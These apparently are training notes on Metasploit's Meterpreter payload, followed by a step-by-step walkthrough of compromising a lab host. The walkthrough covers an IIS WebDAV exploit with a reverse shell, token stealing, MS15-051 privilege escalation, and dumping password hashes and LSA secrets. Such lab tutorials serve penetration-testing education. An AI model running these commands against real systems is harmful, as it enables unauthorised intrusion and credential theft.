The `Meterpreter` Payload is a specific type of multi-faceted, extensible Payload that uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

## Running Meterpreter

To run Meterpreter, we only need to select any version of it from the `show payloads` output, taking into consideration the type of connection and OS we are attacking.

When the exploit is completed, the following events occur:

When the exploit is completed, the following events occur:

- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
- The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
- The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
- Lastly, Meterpreter loads extensions. It will always load `stdapi` and load `priv` if the module gives administrative rights. All of these extensions are loaded over AES encryption.

Whenever the Meterpreter Payload is sent and run on the target system, we receive a `Meterpreter shell`. We can then immediately issue the `help` command to see what the Meterpreter shell is capable of.

#### MSF - Meterpreter Commands

	meterpreter > help

## Using Meterpreter

We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment's effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.

#### MSF - Scanning Target

	msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

	msf6 > hosts

	msf6 > services

Next, we look up some information about the services running on this box. Specifically, we want to explore port 80 and what kind of web service is hosted there.

We notice it is an under-construction website—nothing web-related to see here. However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running `Microsoft IIS httpd 6.0`. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: `CVE-2017-7269`. It also has a Metasploit module developed for it.

#### MSF - Searching for Exploit

	msf6 > search iis_webdav_upload_asp

	msf6 > use 0

We proceed to set the needed parameters. For now, these would be `LHOST`and `RHOST` as everything else on the target seems to be running the default configuration.

#### MSF - Configuring Exploit & Payload

	msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

	msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

	msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

	meterpreter >

We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

#### MSF - Meterpreter Migration 

	meterpreter > getuid

	meterpreter > ps

	meterpreter > steal_token 1836

	meterpreter > getuid

Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the `C:\Inetpub\` location, we find an interesting folder named `AdminScripts`. However, unfortunately, we do not have permission to read what is inside it.

#### MSF - Interacting with the Target

	c:\Inetpub>dir

	c:\Inetpub>cd AdminScripts

We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

#### MSF - Session Handling

	meterpreter > bg
	Background session 1? [y/N] y  
	
	msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

	msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0 
	msf6 post(multi/recon/local_exploit_suggester) > show options

	msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

	msf6 post(multi/recon/local_exploit_suggester) > run


Running the recon module presents us with a multitude of options. Going through each separate one, we land on the `ms15_051_client_copy_image` entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

#### MSF - Privilege Escalation

	msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

	msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

	msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

	msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

	msf6 exploit(windows/local/ms15_051_client_copy_image) > run

	meterpreter > getuid

From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others

#### MSF - Dumping Hashes

	meterpreter > hashdump

	meterpreter > lsa_dump_sam

#### MSF - Meterpreter LSA Secrets Dump

	meterpreter > lsa_dump_secrets

	

